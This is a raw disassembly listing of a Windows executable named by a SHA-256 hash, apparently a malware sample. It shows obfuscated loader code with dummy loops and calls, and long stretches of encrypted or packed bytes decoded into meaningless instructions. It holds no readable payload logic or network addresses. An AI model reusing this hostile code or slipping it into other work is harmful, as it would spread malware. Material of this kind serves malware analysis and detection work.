
7333f0ca9d0a67178ccb77e01d155daf56506884f74f224e63e4b5a5d89e9c55.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x98
  401009:	mov    DWORD PTR ds:0x433817,0x1c
  401013:	cmp    DWORD PTR ds:0x433817,0x0
  40101a:	je     0x40106d
  401020:	cmp    DWORD PTR ds:0x433817,0x6
  401027:	jne    0x401040
  40102d:	push   0x8196
  401032:	push   DWORD PTR [ebp-0xc]
  401035:	push   0x6434
  40103a:	call   DWORD PTR ds:0x412268
  401040:	cmp    DWORD PTR ds:0x433817,0x7
  401047:	jne    0x40105b
  40104d:	xor    eax,eax
  40104f:	xor    eax,DWORD PTR ds:0x433817
  401055:	dec    eax
  401056:	mov    ds:0x433817,eax
  40105b:	mov    eax,ds:0x433817
  401060:	dec    eax
  401061:	mov    ds:0x433817,eax
  401066:	jmp    0x401013
  40106b:	or     ecx,eax
  40106d:	mov    eax,ds:0x413b34
  401072:	mov    DWORD PTR [ebp-0x18],eax
  401075:	sub    DWORD PTR ds:0x43381b,0x1705
  40107f:	mov    eax,ds:0x413c44
  401084:	sub    DWORD PTR ds:0x43381f,edx
  40108a:	mov    DWORD PTR [ebp-0x48],eax
  40108d:	xor    eax,ecx
  40108f:	mov    DWORD PTR [ebp-0x10],0xf89c8531
  401096:	add    eax,DWORD PTR ds:0x433853
  40109c:	mov    DWORD PTR [ebp-0x1c],0xf89c8532
  4010a3:	sbb    eax,eax
  4010a5:	mov    eax,DWORD PTR [ebp-0x10]
  4010a8:	push   ebx
  4010a9:	movzx  ebx,BYTE PTR ds:0x43382f
  4010b0:	sbb    ebx,DWORD PTR ds:0x433813
  4010b6:	mov    DWORD PTR ds:0x43382f,ebx
  4010bc:	push   esi
  4010bd:	mov    esi,0x7510854
  4010c2:	xor    eax,esi
  4010c4:	push   edi
  4010c5:	or     ecx,ebx
  4010c7:	mov    edi,0x32729b
  4010cc:	add    eax,edi
  4010ce:	and    DWORD PTR ds:0x4338ab,0x264c
  4010d8:	mov    DWORD PTR [ebp-0x38],eax
  4010db:	mov    DWORD PTR ds:0x43382f,0x18
  4010e5:	cmp    DWORD PTR ds:0x43382f,0x0
  4010ec:	je     0x401146
  4010f2:	cmp    DWORD PTR ds:0x43382f,0xc
  4010f9:	jne    0x401108
  4010ff:	push   DWORD PTR [ebp-0x24]
  401102:	call   DWORD PTR ds:0x4120b4
  401108:	cmp    DWORD PTR ds:0x43382f,0xd
  40110f:	jne    0x401122
  401115:	mov    ebx,DWORD PTR ds:0x43382f
  40111b:	dec    ebx
  40111c:	mov    DWORD PTR ds:0x43382f,ebx
  401122:	xor    ebx,ebx
  401124:	add    ebx,DWORD PTR ds:0x43382f
  40112a:	dec    ebx
  40112b:	mov    DWORD PTR ds:0x43382f,ebx
  401131:	jmp    0x4010e5
  401136:	mov    ecx,DWORD PTR ds:0x4337f7
  40113c:	mov    eax,ds:0x4338b3
  401141:	sub    ecx,eax
  401143:	add    ecx,DWORD PTR [ecx+eax*1]
  401146:	mov    DWORD PTR [ebp-0x44],0xf89cb531
  40114d:	mov    DWORD PTR [ebp-0x54],0xf89f0531
  401154:	mov    DWORD PTR [ebp-0x4c],0xf89c85f1
  40115b:	or     DWORD PTR ds:0x43389b,0x1296
  401165:	mov    DWORD PTR [ebp-0x3c],0xf89c85d1
  40116c:	mov    eax,DWORD PTR [ebp-0x10]
  40116f:	sub    DWORD PTR ds:0x43377f,0x1011
  401179:	xor    eax,esi
  40117b:	add    eax,edi
  40117d:	mov    DWORD PTR [ebp-0xc],eax
  401180:	sbb    DWORD PTR ds:0x43379f,0x6b1e
  40118a:	mov    DWORD PTR [ebp-0x28],0xf89c853e
  401191:	mov    BYTE PTR [ebp-0x11],0x67
  401195:	mov    eax,DWORD PTR [ebp-0x10]
  401198:	xor    DWORD PTR ds:0x4337db,0x46ad
  4011a2:	xor    eax,esi
  4011a4:	add    eax,edi
  4011a6:	jmp    0x401347
  4011ab:	jb     0x401145
  4011ad:	fsub   DWORD PTR [edx]
  4011af:	lock bound esi,QWORD PTR [eax+0x68]
  4011b3:	push   ecx
  4011b4:	in     al,0x70
  4011b6:	or     BYTE PTR [esi+0x13],cl
  4011b9:	cdq    
  4011ba:	xchg   ecx,eax
  4011bb:	jle    0x40123b
  4011bd:	jle    0x40123d
  4011bf:	cli    
  4011c0:	jg     0x401240
  4011c2:	jle    0x401192
  4011c4:	xlat   BYTE PTR ds:[ebx]
  4011c5:	cmp    eax,0xcfd339d5
  4011ca:	rol    edx,1
  4011cc:	pop    es
  4011cd:	add    al,0x3
  4011cf:	add    BYTE PTR [eax+eax*1],al
  4011d2:	rdpmc  
  4011d4:	xadd   BYTE PTR [eax],bl
  4011d7:	(bad)  
  4011d8:	adc    BYTE PTR [edi],bl
  4011da:	mov    ecx,0xddb70058
  4011df:	push   cs
  4011e0:	out    dx,eax
  4011e1:	mov    ebp,0x8e03d6db
  4011e6:	es mov esi,0x1541a2f4
  4011ec:	lods   eax,DWORD PTR ds:[esi]
  4011ed:	fiadd  WORD PTR [esi+0x1f]
  4011f0:	data16 in al,dx
  4011f2:	outs   dx,DWORD PTR ds:[esi]
  4011f3:	or     edx,DWORD PTR [ecx]
  4011f5:	pushf  
  4011f6:	js     0x4011ce
  4011f8:	inc    eax
  4011f9:	stos   BYTE PTR es:[edi],al
  4011fa:	push   ebx
  4011fb:	sub    eax,0xad3cc4d1
  401200:	mov    bh,BYTE PTR [ebx-0x3b]
  401203:	stos   DWORD PTR es:[edi],eax
  401204:	push   es
  401205:	(bad)  
  401206:	rol    DWORD PTR [ecx+0x3990d6f9],cl
  40120c:	jmp    0x40123e
  40120e:	mov    ebp,ecx
  401210:	dec    edi
  401211:	out    0xa6,al
  401213:	inc    ecx
  401214:	call   DWORD PTR [edi-0x2556f868]
  40121a:	mov    ebp,0x5536ed4d
  40121f:	and    esi,DWORD PTR [edx-0x43619116]
  401225:	jnp    0x401238
  401227:	ret    
  401228:	xchg   edx,eax
  401229:	and    esp,edx
  40122b:	jmp    0x40128b
  40122d:	ret    0xb8e4
  401230:	lock jmp 0xd765:0x74cf3192
  401238:	and    ch,cl
  40123a:	add    bl,cl
  40123c:	adc    DWORD PTR [ecx-0x5a],edx
  40123f:	xor    eax,0x78616f03
  401244:	or     BYTE PTR [ecx],dh
  401246:	fisttp QWORD PTR [esi+0x7f752854]
  40124c:	(bad)
  401251:	or     ebx,DWORD PTR [ebx+0x55]
  401254:	fst    st(6)
  401256:	or     ebx,edx
  401258:	pop    esp
  401259:	fstp   DWORD PTR [ecx]
  40125b:	jno    0x4011fb
  40125d:	inc    esi
  40125e:	dec    ebx
  40125f:	aaa    
  401260:	adc    eax,0x1a29772b
  401265:	sar    DWORD PTR [esi],cl
  401267:	dec    edi
  401268:	call   0x774bb739
  40126d:	imul   edi,DWORD PTR [esi+0x2b7495b7],0x917d6e06
  401277:	lahf   
  401278:	jns    0x40120f
  40127a:	leave  
  40127b:	pop    eax
  40127c:	mov    esi,es
  40127e:	xchg   ebx,eax
  40127f:	sar    DWORD PTR [esi+0x2390c324],0xf4
  401286:	pop    ss
  401287:	xor    esp,eax
  401289:	loop   0x4012f1
  40128b:	adc    DWORD PTR [edi+eax*4-0x69],edx
  40128f:	pop    ss
  401290:	inc    ecx
  401291:	iret   
  401292:	xor    ebp,DWORD PTR ds:0xd87dc3b8
  401298:	mov    edx,0x8c283f78
  40129d:	xor    al,0xd
  40129f:	imul   ebp,DWORD PTR ss:[eax-0x164b222f],0xffffffb3
  4012a7:	jb     0x401257
  4012a9:	jns    0x401289
  4012ab:	repz jecxz 0x40128d
  4012ae:	mov    esi,0x8e40a99e
  4012b3:	xchg   edx,eax
  4012b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4012b5:	mov    ecx,0x419bb59c
  4012ba:	stc    
  4012bb:	jne    0x4012e0
  4012bd:	mov    edx,0x273585d4
  4012c2:	push   eax
  4012c3:	push   0x28
  4012c5:	jg     0x40124d
  4012c7:	push   ds
  4012c8:	icebp  
  4012c9:	xor    eax,esi
  4012cb:	(bad)  
  4012cc:	cmp    BYTE PTR [ebp-0x5],bh
  4012cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4012d0:	and    BYTE PTR [eax-0x50],0x19
  4012d4:	mov    ds:0x376f9935,al
  4012d9:	addr16 leave 
  4012db:	fisttp QWORD PTR [eax+0x5cb974db]
  4012e1:	jb     0x40126d
  4012e3:	addr16 in al,0xb6
  4012e6:	mov    bl,0x7c
  4012e8:	movq   QWORD PTR [edi+edx*1],mm1
  4012ec:	neg    BYTE PTR [edx-0x30]
  4012ef:	or     eax,0xbb9ec03f
  4012f4:	ja     0x4012de
  4012f6:	lds    esi,FWORD PTR [ebx+0x79]
  4012f9:	mov    dl,0xca
  4012fb:	cli    
  4012fc:	aas    
  4012fd:	out    dx,eax
  4012fe:	xor    BYTE PTR [eax-0x14b1b0d2],ah
  401304:	imul   ebx,DWORD PTR [esi-0x43],0x6d698e9b
  40130b:	add    BYTE PTR [eax],0x58
  40130e:	lds    edx,FWORD PTR [ebx-0x1f]
  401311:	pop    ds
  401312:	rcl    DWORD PTR [ecx],1
  401314:	out    dx,al
  401315:	push   edx
  401317:	(bad)  
  401318:	icebp  
  401319:	lock add eax,0x60833a1a
  40131f:	jmp    0x4012d3
  401321:	add    eax,edx
  401323:	fwait
  401324:	int3   
  401325:	cld    
  401326:	and    bh,BYTE PTR [ecx-0xd]
  401329:	add    ecx,ebx
  40132b:	dec    edx
  40132c:	je     0x4012e0
  40132e:	pusha  
  40132f:	inc    edx
  401330:	fcmovnu st,st(3)
  401332:	adc    cl,BYTE PTR [ebx+eiz*8-0x5a60753]
  401339:	jle    0x4013b2
  40133b:	xchg   ecx,eax
  40133c:	pop    ds
  40133d:	mov    ah,0x81
  40133f:	ror    BYTE PTR [ecx+0x6b7ca19a],1
  401345:	add    edi,DWORD PTR [edx-0x7e0bba77]
  40134b:	and    eax,0x4337d3
  401350:	add    BYTE PTR [eax],al
  401352:	add    BYTE PTR [eax],al
  401354:	jmp    0x401366
  401359:	mov    ebx,DWORD PTR ds:0x4337d3
  40135f:	inc    ebx
  401360:	mov    DWORD PTR ds:0x4337d3,ebx
  401366:	cmp    DWORD PTR ds:0x4337d3,0x10
  40136d:	jae    0x401543
  401373:	cmp    DWORD PTR ds:0x4337d3,0x12
  40137a:	jne    0x401393
  401380:	push   0x3bad
  401385:	push   0x706b
  40138a:	push   DWORD PTR [ebp-0x20]
  40138d:	call   DWORD PTR ds:0x412284
  401393:	jmp    0x401359
  401398:	or     DWORD PTR ds:0x43378b,0x43377f
  4013a2:	jmp    0x401543
  4013a7:	dec    ebp
  4013a8:	push   0xb1638b43
  4013ad:	push   ebp
  4013ae:	push   0xd91cd24
  4013b3:	jp     0x401389
  4013b5:	mov    ds,WORD PTR [ebx-0x6]
  4013b8:	jg     0x401438
  4013ba:	jle    0x4013b6
  4013bc:	jg     0x40143c
  4013be:	jle    0x4013fd
  4013c0:	dec    esp
  4013c1:	icebp  
  4013c2:	jns    0x401430
  4013c4:	inc    ecx
  4013c5:	pop    esp
  4013c6:	sub    eax,0xb748240f
  4013cb:	call   0xc40fcd3
  4013d0:	fsubrp st(3),st
  4013d2:	push   esi
  4013d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4013d4:	mov    ch,0x70
  4013d6:	out    dx,al
  4013d7:	push   edx
  4013d9:	and    BYTE PTR [edx+edi*1-0x7d],ch
  4013dd:	ficomp WORD PTR [esi+0x5b]
  4013e0:	daa    
  4013e1:	dec    ecx
  4013e2:	shr    bh,cl
  4013e4:	or     BYTE PTR [edx+0x78],bl
  4013e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4013e8:	adc    bh,BYTE PTR ds:0x5f3b258d
  4013ee:	cmp    dh,BYTE PTR [edi]
  4013f0:	stos   DWORD PTR es:[edi],eax
  4013f1:	sbb    al,0x82
  4013f3:	xor    eax,0x4303271a
  4013f8:	cmp    cl,BYTE PTR [ecx-0x3a5a564c]
  4013fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4013ff:	inc    ecx
  401400:	out    0xce,eax
  401402:	imul   ecx,DWORD PTR [ebx+eax*1],0xffffffdc
  401406:	xor    edi,DWORD PTR [eax]
  401408:	fild   DWORD PTR [eax]
  40140a:	pop    esp
  40140b:	add    eax,0xaf99aea3
  401410:	dec    edi
  401411:	cwde   
  401412:	cli    
  401413:	cs clc 
  401415:	inc    ebp
  401416:	ss inc ebx
  401418:	xor    ch,BYTE PTR [esi+0x4f60ffba]
  40141e:	call   0xd8be:0x94ccb595
  401425:	fs pop ds
  401427:	imul   eax,DWORD PTR [esi+0x72c7f4fc],0x2b661b48
  401431:	xor    DWORD PTR [edi+0x7a],0x48
  401435:	(bad)  
  401436:	scas   al,BYTE PTR es:[edi]
  401437:	xor    DWORD PTR ds:0xa2eaf7ea,0xffffffa2
  40143e:	and    ah,BYTE PTR [edx-0x44]
  401441:	jp     0x40140b
  401443:	jmp    0x4f05:0x5b994587
  40144a:	or     bl,BYTE PTR es:[eax+0x39]
  40144e:	aam    0x68
  401450:	popa   
  401451:	mov    ds:0x4f7ce5bf,eax
  401456:	add    ah,ah
  401458:	icebp  
  401459:	(bad)  
  40145a:	in     al,0xe9
  40145c:	cmp    DWORD PTR [ebx+0x6e],0x4d
  401460:	lea    ecx,[ebp-0x1ce7bacf]
  401466:	jle    0x401417
  401468:	jo     0x401497
  40146a:	fld    TBYTE PTR [esi+0x57]
  40146d:	inc    edx
  40146e:	es loope 0x40147f
  401471:	div    BYTE PTR [esi+0x10]
  401474:	fsub   QWORD PTR [eax+edx*1-0x58]
  401478:	mov    eax,DWORD PTR [edi-0x5bc300ad]
  40147e:	mov    esi,ds
  401480:	lods   eax,DWORD PTR ds:[esi]
  401481:	ss leave 
  401483:	pusha  
  401484:	inc    ebp
  401485:	(bad)  
  401488:	arpl   WORD PTR [bx+0x3a1b],dx
  40148d:	imul   edx,DWORD PTR [eax],0xffffffbf
  401490:	pop    es
  401491:	ror    BYTE PTR [edx+0x60c940ea],cl
  401497:	or     al,0xdc
  401499:	mov    eax,0x8eeaf406
  40149e:	ja     0x401469
  4014a0:	xor    ecx,edi
  4014a2:	imul   eax,esi,0x51d3f842
  4014a8:	cmc    
  4014a9:	pop    esi
  4014aa:	jbe    0x4014fc
  4014ac:	cdq    
  4014ad:	and    al,0xfa
  4014af:	pushf  
  4014b0:	and    ch,ah
  4014b2:	lods   al,BYTE PTR gs:[esi]
  4014b4:	push   ss
  4014b5:	adc    ebx,0xc9f67ca4
  4014bb:	dec    esi
  4014bc:	aaa    
  4014bd:	mov    ah,0xe2
  4014bf:	push   ecx
  4014c0:	push   edi
  4014c1:	retf   
  4014c2:	xchg   edi,eax
  4014c3:	nop
  4014c4:	xor    eax,0x3737e4e
  4014c9:	arpl   bp,sp
  4014cb:	ins    DWORD PTR es:[edi],dx
  4014cc:	or     dh,cl
  4014ce:	call   FWORD PTR gs:[edi+0x68]
  4014d2:	fidivr WORD PTR [ebx+0x4b]
  4014d5:	push   ecx
  4014d6:	in     eax,0x9f
  4014d8:	mov    cl,0x5e
  4014da:	jbe    0x4014d3
  4014dc:	test   DWORD PTR [ebp-0x71],esp
  4014df:	push   edi
  4014e0:	(bad)  
  4014e1:	inc    dh
  4014e3:	(bad)
  4014e7:	sbb    al,0x9
  4014e9:	popf   
  4014ea:	inc    ecx
  4014eb:	dec    ebx
  4014ec:	jl     0x401565
  4014ee:	fs pop esp
  4014f0:	out    dx,eax
  4014f1:	jns    0x40153d
  4014f3:	or     BYTE PTR [ebp-0x4d],bl
  4014f6:	(bad)  
  4014f7:	jmp    0x4014be
  4014f9:	mov    DWORD PTR [eax],eax
  4014fb:	sbb    eax,ecx
  4014fd:	mul    DWORD PTR [ebp-0x563aaee3]
  401503:	stos   DWORD PTR es:[edi],eax
  401504:	xchg   BYTE PTR [ebx+0x3f753703],ah
  40150a:	xlat   BYTE PTR ds:[ebx]
  40150b:	out    0xb5,eax
  40150d:	cli    
  40150e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40150f:	inc    esi
  401510:	sbb    ch,BYTE PTR [ebp+0x7f0be399]
  401516:	fnstenv [ebx]
  401518:	in     eax,0x99
  40151a:	xchg   edi,eax
  40151b:	imul   esp,DWORD PTR [ecx-0x117ab3e5],0xf3f8c005
  401525:	cmp    esi,DWORD PTR [eax+0x5c4b82f6]
  40152b:	mov    ebp,0x739b0c2c
  401530:	dec    esp
  401531:	sbb    dh,0x9
  401534:	scas   eax,DWORD PTR es:[edi]
  401535:	inc    esi
  401536:	dec    edi
  401537:	add    eax,0xedb8b50f
  40153c:	or     eax,0x5abda08d
  401541:	sub    al,0x1a
  401543:	mov    eax,DWORD PTR [ebp-0x3c]
  401546:	xor    DWORD PTR ds:0x43378f,ebx
  40154c:	xor    eax,esi
  40154e:	neg    ecx
  401550:	jmp    0x4016f1
  401555:	cli    
  401556:	fcomp  QWORD PTR [edx-0x4caea7e9]
  40155c:	jno    0x4014f6
  40155e:	cmp    ah,BYTE PTR [ebx-0x61390e1d]
  401564:	rol    BYTE PTR [esi],0x7d
  401567:	jle    0x4015e7
  401569:	cli    
  40156a:	jg     0x4015ea
  40156c:	jle    0x401536
  40156e:	jle    0x401520
  401570:	jmp    0x600da992
  401575:	pop    ebx
  401576:	pop    es
  401577:	xchg   edi,eax
  401578:	ja     0x4015ea
  40157a:	jp     0x4015ee
  40157c:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  40157e:	nop
  40157f:	mov    DWORD PTR ds:0xd2ef55b,eax
  401585:	je     0x4015fb
  401587:	mov    es,WORD PTR [ebp-0x17]
  40158a:	test   BYTE PTR ds:0x5586304f,0x92
  401591:	imul   esp,esp,0xb27fd6ee
  401597:	xor    DWORD PTR [edi],0xf65ceb9f
  40159d:	jmp    0x4015de
  40159f:	dec    edx
  4015a0:	mov    ds:0xccf75fd1,al
  4015a5:	add    esi,DWORD PTR [ecx+0x7d2b022e]
  4015ab:	(bad)  
  4015ac:	arpl   WORD PTR [eax+0x4e2927c1],di
  4015b2:	jnp    0x401613
  4015b4:	mov    edx,0xf64a7d20
  4015b9:	gs pop ss
  4015bb:	popa   
  4015bc:	xor    DWORD PTR [edx],ecx
  4015be:	add    ebx,DWORD PTR [ecx+edi*8]
  4015c1:	data16 sub al,0x33
  4015c4:	and    DWORD PTR [esi],ebp
  4015c6:	hlt    
  4015c7:	inc    eax
  4015c8:	test   al,0xce
  4015ca:	out    dx,al
  4015cb:	mov    esi,0xf24abd7
  4015d0:	sub    BYTE PTR [ecx-0xe9ea926],cl
  4015d6:	mov    cl,0x3d
  4015d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4015d9:	aas    
  4015da:	mov    ds:0x2ae859f0,al
  4015df:	popf   
  4015e0:	mov    eax,ds:0x5146e5cd
  4015e5:	xchg   BYTE PTR [edi],cl
  4015e7:	mov    ebx,0x897e5c40
  4015ec:	cmp    eax,0x50f95c2b
  4015f1:	xchg   DWORD PTR [esi+0x41],ebx
  4015f4:	jns    0x4015d4
  4015f6:	retf   
  4015f7:	push   eax
  4015f8:	ins    DWORD PTR es:[edi],dx
  4015f9:	or     al,0x86
  4015fb:	loop   0x4015a5
  4015fd:	push   ecx
  4015fe:	test   eax,0xb71b2e2c
  401603:	js     0x401598
  401605:	clc    
  401606:	pop    ss
  401607:	sub    eax,0x8e2656bc
  40160c:	int3   
  40160d:	cmp    eax,0x7e058f81
  401612:	bound  esp,QWORD PTR [edx]
  401614:	pop    esi
  401615:	sti    
  401616:	push   cs
  401617:	mov    bh,0x78
  401619:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40161a:	push   0x52870c16
  40161f:	rcr    DWORD PTR [edi-0x1e],cl
  401622:	loop   0x40164c
  401624:	fmul   QWORD PTR [eax]
  401626:	pop    ebx
  401627:	cmp    al,0x34
  401629:	mov    ch,0xc1
  40162b:	mov    ebp,0x39741813
  401630:	das    
  401631:	add    ebp,eax
  401633:	scas   al,BYTE PTR es:[edi]
  401634:	fdiv   DWORD PTR [edi+0x13496f9a]
  40163a:	dec    esp
  40163b:	push   0xed4361ae
  401640:	mov    ebp,DWORD PTR [ebx-0x5e]
  401643:	xchg   ecx,eax
  401644:	je     0x4016b8
  401646:	cwde   
  401647:	jae    0x401692
  401649:	or     DWORD PTR [edx],ecx
  40164b:	sub    eax,ecx
  40164d:	mov    eax,0x21949fd5
  401652:	pop    eax
  401653:	(bad)  
  401654:	mov    ch,0x46
  401656:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401657:	(bad)  
  401658:	dec    ecx
  401659:	jne    0x401629
  40165b:	xchg   esi,eax
  40165c:	not    BYTE PTR [edi]
  40165e:	mov    esp,0xef4e569b
  401663:	dec    ecx
  401664:	je     0x40161e
  401666:	or     al,0xd9
  401668:	fs dec eax
  40166a:	lock pop ecx
  40166c:	adc    BYTE PTR [ebp-0x2fbb0ee6],bh
  401672:	mov    BYTE PTR [edx],bl
  401674:	jno    0x4016bc
  401676:	popa   
  401677:	sbb    bl,BYTE PTR [edx-0x27]
  40167a:	xor    ebp,DWORD PTR [edi+0x53bf33f5]
  401680:	push   ecx
  401681:	(bad)  
  401684:	mov    ds:0xeb6ec598,al
  401689:	ins    DWORD PTR es:[edi],dx
  40168a:	xor    BYTE PTR [ecx-0x18],cl
  40168d:	mov    BYTE PTR [ecx+0x72],0x47
  401691:	mov    al,0x5a
  401693:	sub    edx,DWORD PTR [edx]
  401695:	pop    ebx
  401696:	adc    edi,DWORD PTR [esi-0x4ca6424a]
  40169c:	inc    ebx
  40169d:	mov    ds:0x7e389f30,eax
  4016a2:	sahf   
  4016a3:	sti    
  4016a4:	test   eax,0xbe5b378e
  4016a9:	and    esi,DWORD PTR [edx]
  4016ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4016ac:	mov    bh,ch
  4016ae:	push   0x27
  4016b0:	sub    edi,DWORD PTR [edx+0x46b14cc]
  4016b6:	mov    ch,0x9b
  4016b8:	xchg   BYTE PTR [esi],cl
  4016ba:	add    BYTE PTR [edx+0x7b],bl
  4016bd:	xchg   BYTE PTR [edx],ch
  4016bf:	xchg   esp,eax
  4016c0:	jp     0x40172f
  4016c2:	iret   
  4016c3:	push   esp
  4016c4:	inc    eax
  4016c5:	cmp    esp,DWORD PTR [ebx+edi*2+0x58]
  4016c9:	fmul   st(1),st
  4016cb:	add    DWORD PTR [ebx],esp
  4016cd:	daa    
  4016ce:	and    edx,DWORD PTR [ebp-0x74598c53]
  4016d4:	mov    eax,0x847733cb
  4016d9:	xlat   BYTE PTR ds:[ebx]
  4016da:	inc    edx
  4016db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4016dc:	sub    al,0x76
  4016de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4016df:	dec    ebx
  4016e0:	shl    bl,cl
  4016e2:	stos   BYTE PTR es:[edi],al
  4016e3:	jbe    0x40168b
  4016e5:	ret    0x9ba1
  4016e8:	fwait
  4016e9:	push   edx
  4016ea:	mov    dh,0xa4
  4016ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4016ed:	jle    0x4016a7
  4016ef:	push   edi
  4016f0:	fld    QWORD PTR [ebx]
  4016f2:	(bad)  
  4016f3:	mov    DWORD PTR [ebp-0x34],eax
  4016f6:	mov    eax,DWORD PTR [ebp-0x44]
  4016f9:	xor    eax,esi
  4016fb:	sbb    ecx,ecx
  4016fd:	add    eax,edi
  4016ff:	mov    DWORD PTR [ebp-0x30],eax
  401702:	mov    eax,DWORD PTR [ebp-0x28]
  401705:	and    DWORD PTR ds:0x43385f,0x0
  40170f:	jmp    0x401721
  401714:	mov    ebx,DWORD PTR ds:0x43385f
  40171a:	inc    ebx
  40171b:	mov    DWORD PTR ds:0x43385f,ebx
  401721:	cmp    DWORD PTR ds:0x43385f,0x18
  401728:	jae    0x40176c
  40172e:	cmp    DWORD PTR ds:0x43385f,0xa
  401735:	jne    0x40174b
  40173b:	push   0x7b82
  401740:	push   0x1a57
  401745:	call   DWORD PTR ds:0x41226c
  40174b:	cmp    DWORD PTR ds:0x43385f,0x9
  401752:	jne    0x401767
  401758:	xor    ebx,ebx
  40175a:	xor    ebx,DWORD PTR ds:0x43385f
  401760:	inc    ebx
  401761:	mov    DWORD PTR ds:0x43385f,ebx
  401767:	jmp    0x401714
  40176c:	xor    eax,esi
  40176e:	sbb    DWORD PTR ds:0x433783,0x47a9
  401778:	add    eax,edi
  40177a:	dec    DWORD PTR ds:0x433797
  401780:	mov    DWORD PTR [ebp-0x2c],eax
  401783:	lea    eax,[ebp-0x98]
  401789:	mov    DWORD PTR [ebp-0x8],eax
  40178c:	movzx  ecx,WORD PTR ds:0x43378b
  401793:	and    ecx,DWORD PTR ds:0x4337db
  401799:	mov    DWORD PTR ds:0x43378b,ecx
  40179f:	mov    eax,DWORD PTR [ebp-0x10]
  4017a2:	mov    DWORD PTR [ebp-0x24],eax
  4017a5:	and    DWORD PTR ds:0x4338af,0x0
  4017af:	jmp    0x4017c3
  4017b4:	xor    ebx,ebx
  4017b6:	or     ebx,DWORD PTR ds:0x4338af
  4017bc:	inc    ebx
  4017bd:	mov    DWORD PTR ds:0x4338af,ebx
  4017c3:	cmp    DWORD PTR ds:0x4338af,0x1c
  4017ca:	jae    0x40184e
  4017d0:	cmp    DWORD PTR ds:0x4338af,0x11
  4017d7:	jne    0x4017f0
  4017dd:	push   DWORD PTR [ebp-0x14]
  4017e0:	push   0x35e4
  4017e5:	push   0x7b35
  4017ea:	call   DWORD PTR ds:0x412270
  4017f0:	cmp    DWORD PTR ds:0x4338af,0x10
  4017f7:	jne    0x40180a
  4017fd:	mov    ebx,DWORD PTR ds:0x4338af
  401803:	inc    ebx
  401804:	mov    DWORD PTR ds:0x4338af,ebx
  40180a:	jmp    0x4017b4
  40180f:	and    DWORD PTR ds:0x433863,0x0
  401819:	mov    eax,ds:0x433863
  40181e:	inc    eax
  40181f:	mov    ds:0x433863,eax
  401824:	cmp    DWORD PTR ds:0x433863,0x27
  40182b:	jne    0x401841
  401831:	push   0x1cc5
  401836:	push   0x4337a3
  40183b:	call   DWORD PTR ds:0x412338
  401841:	cmp    DWORD PTR ds:0x433863,0x1d
  401848:	jb     0x401819
  40184e:	mov    eax,DWORD PTR [ebp-0x1c]
  401851:	xor    ebx,DWORD PTR ds:0x43389f
  401857:	mov    DWORD PTR [ebp-0x20],eax
  40185a:	and    DWORD PTR ds:0x4338ab,0x0
  401864:	jmp    0x401878
  401869:	xor    ecx,ecx
  40186b:	xor    ecx,DWORD PTR ds:0x4338ab
  401871:	inc    ecx
  401872:	mov    DWORD PTR ds:0x4338ab,ecx
  401878:	cmp    DWORD PTR ds:0x4338ab,0x12
  40187f:	jae    0x4018d1
  401885:	cmp    DWORD PTR ds:0x4338ab,0x4
  40188c:	jne    0x4018b2
  401892:	push   0x6e91
  401897:	push   DWORD PTR [ebp-0x10]
  40189a:	push   DWORD PTR [ebp-0x24]
  40189d:	push   0x5930
  4018a2:	push   0x63f1
  4018a7:	push   0x153a
  4018ac:	call   DWORD PTR ds:0x412274
  4018b2:	cmp    DWORD PTR ds:0x4338ab,0x3
  4018b9:	jne    0x4018cc
  4018bf:	mov    ecx,DWORD PTR ds:0x4338ab
  4018c5:	inc    ecx
  4018c6:	mov    DWORD PTR ds:0x4338ab,ecx
  4018cc:	jmp    0x401869
  4018d1:	mov    ebx,0xf89c853d
  4018d6:	jmp    0x401a77
  4018db:	or     ecx,esi
  4018dd:	out    0x8,al
  4018df:	jecxz  0x401911
  4018e1:	icebp  
  4018e2:	int    0x17
  4018e4:	add    eax,0x66a66ade
  4018e9:	arpl   WORD PTR [edx-0x7e],bp
  4018ec:	jp     0x40196c
  4018ee:	jle    0x4018ea
  4018f0:	jg     0x401970
  4018f2:	jle    0x40192b
  4018f4:	mov    edx,0x6bac65ea
  4018f9:	mov    bh,0xc4
  4018fb:	sub    eax,0x3419fc7f
  401900:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401901:	(bad)  
  401902:	jge    0x40194a
  401904:	add    BYTE PTR [edx-0x6c],dl
  401907:	push   ebp
  401908:	fsub   st(0),st
  40190a:	mov    al,0x39
  40190c:	sub    al,dh
  40190e:	hlt    
  40190f:	test   BYTE PTR [ebp-0x57ba3b5a],ch
  401915:	sub    al,BYTE PTR es:[esi+ecx*1]
  401919:	int3   
  40191a:	xchg   DWORD PTR [edx-0x5400b580],edi
  401920:	out    0x7,al
  401922:	pop    ebx
  401923:	ret    0xb5c1
  401926:	(bad)  
  401927:	sbb    al,0xda
  401929:	or     DWORD PTR [edx-0x53a3ed8e],esp
  40192f:	repnz pop ebp
  401931:	mov    ecx,0x43c53e10
  401936:	mov    ebp,0x8629158c
  40193c:	xor    esp,DWORD PTR [eax]
  40193e:	and    ch,BYTE PTR [esi+0x195797c7]
  401944:	dec    eax
  401945:	popa   
  401946:	add    al,0xf5
  401948:	call   0x6087:0x4a97d05c
  40194f:	and    al,BYTE PTR [ecx+0x23f30c21]
  401955:	adc    BYTE PTR [ecx-0x70],0x3c
  401959:	and    al,0x5d
  40195b:	stos   BYTE PTR es:[edi],al
  40195c:	dec    eax
  40195d:	dec    eax
  40195e:	jp     0x4019d4
  401960:	mov    dl,0xaf
  401963:	and    eax,0x59809848
  401968:	(bad)  
  401969:	stos   BYTE PTR es:[edi],al
  40196a:	loope  0x401974
